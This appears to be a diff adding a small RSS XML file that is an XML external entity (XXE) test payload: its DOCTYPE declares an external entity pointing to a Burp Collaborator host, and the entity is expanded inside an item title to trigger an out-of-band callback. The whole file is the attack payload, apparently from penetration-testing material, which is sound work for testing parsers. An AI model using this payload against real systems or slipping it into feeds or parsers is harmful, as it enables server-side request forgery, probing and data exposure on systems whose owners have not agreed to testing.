@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE title  [<!ENTITY xxe SYSTEM "http://awa228c9mv47jma9hnd13441qswkk9.burpcollaborator.net"> ]>
+<rss version="2.0">
+
+<channel>
+
+<item>
+<title>Item One Example &xxe;</title>
+<description>This is an example of an Item Check </description>
+</item>
+
+
+</channel>
+</rss>
